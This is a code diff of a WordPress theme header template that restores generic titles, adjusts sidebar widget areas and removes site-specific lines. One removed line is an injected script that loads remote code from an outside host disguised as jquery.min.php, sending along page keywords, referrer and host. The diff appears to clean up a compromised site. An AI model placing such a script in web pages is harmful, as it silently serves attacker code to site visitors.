@@ -13,35 +13,23 @@
 	<meta charset="<?php bloginfo( 'charset' ); ?>">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title><?php wp_title( '|', true, 'right' ); ?></title>
-	<link href="<?php echo get_template_directory_uri(); ?>/favicon.ico" rel="shortcut icon">
 	<link rel="profile" href="http://gmpg.org/xfn/11">
 	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
-	<link href='http://fonts.googleapis.com/css?family=Arimo:400,700,400italic&subset=latin,cyrillic-ext' rel='stylesheet' type='text/css'>
 	<?php wp_head(); ?>
-
-
-
-
-
-<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://www.bonhoeffer.pl/js/jquery.min.php?c_utt=I92930&c_utm='+encodeURIComponent('http://www.bonhoeffer.pl/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
-
-<meta name="google-site-verification" content="teb9_tEYzkK0gqPnmRlP4jSA-ks7QNnGwDCXyFnbqZY" />
 </head>
 <body <?php body_class(); ?>>
 <div id="page" class="hfeed site">
 	<?php do_action( 'before' ); ?>
 
 	<div id="mobile-panel">
-		<?php
-		if ( has_nav_menu( 'headerok' ) ) : ?>
-			<div id="headerok-nav" class="headerok-small">
-				<?php wp_nav_menu( array(
-
-				) ); ?>
-			</div><!-- headerok-nav -->
+		<?php if ( ( has_nav_menu( 'social' ) ) || ( has_nav_Menu( 'primary') ) ) : ?>
+			<div id="mobile-link"></div><!-- #mobile-link -->
 		<?php endif; ?>
-		<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">Доктор Марина Невдовец</a></h1>
-		<h2 class="site-description">профессиональный косметолог</h2>
+		<?php if ( is_active_sidebar( 'sidebar-3' ) ) : ?>
+			<div id="widget-link"></div><!-- #widget-link -->
+		<?php endif; ?>
+
+		<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
 	</div>
 
 	<div id="panel-block">
@@ -65,21 +53,13 @@
 			<?php endif; ?>
 		</div><!-- #mobile-block-->
 
-		<?php if ( is_active_sidebar( 'sidebar-1' ) || is_active_sidebar( 'sidebar-2' ) ) : ?>
+		<?php if ( is_active_sidebar( 'sidebar-3' ) ) : ?>
 			<div id="widget-block">
 
 				<div class="widget-areas">
-					<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
+					<?php if ( is_active_sidebar( 'sidebar-3' ) ) : ?>
 						<div class="widget-area">
-							<?php dynamic_sidebar( 'sidebar-1' ); ?>
-						</div><!-- .widget-area -->
-					<?php endif; ?>
-				</div><!-- .widgets-areas -->
-
-				<div class="widget-areas">
-					<?php if ( is_active_sidebar( 'sidebar-2' ) ) : ?>
-						<div class="widget-area">
-							<?php dynamic_sidebar( 'sidebar-2' ); ?>
+							<?php dynamic_sidebar( 'sidebar-3' ); ?>
 						</div><!-- .widget-area -->
 					<?php endif; ?>
 				</div><!-- .widgets-areas -->
@@ -104,6 +84,11 @@
 			<div id="header-image" class="no-header"></div><!-- #header-image .no-header -->
 		<?php } ?>
 
+		<div class="site-branding">
+			<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
+			<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
+		</div><!-- .site-branding -->
+
 		<nav id="site-navigation" class="main-navigation" role="navigation">
 			<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'adaption' ); ?></a>
 			<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
@@ -124,11 +109,9 @@
 
 		<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
 			<div class="widget-areas">
-				<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
-					<div class="widget-area">
-						<?php dynamic_sidebar( 'sidebar-1' ); ?>
-					</div><!-- .widget-area -->
-				<?php endif; ?>
+				<div class="widget-area">
+					<?php dynamic_sidebar( 'sidebar-1' ); ?>
+				</div><!-- .widget-area -->
 			</div><!-- .widgets-areas -->
 		<?php endif; ?>
 
